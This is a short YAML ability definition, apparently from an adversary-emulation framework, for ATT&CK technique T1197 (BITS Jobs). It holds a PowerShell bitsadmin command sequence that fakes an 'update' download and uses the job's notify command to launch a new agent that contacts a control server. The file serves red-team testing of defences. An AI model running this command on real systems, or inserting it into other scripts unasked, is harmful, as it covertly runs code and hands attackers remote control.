- tactic: defense-evasion
  technique_name: BITS Jobs
  technique_id: T1197
  name: BITSAdmin Agent deployment
  description: This ability uses a BITSAdmin job to deploy another agent. It creates
    a fake download from google.com solely to trigger execution of the new agent on  job
    completion.
  executors:
  - name: psh
    platform: windows
    command: "bitsadmin /create update;\nbitsadmin /addfile update https://google.com\
      \ C:\\Users\\Public\\update.exe;\nbitsadmin /setnotifycmdline update \"#{location}\"\
      \ \"#{location} -server #{server} -group bitsadmin -v\";\nbitsadmin /resume\
      \ update;\n "
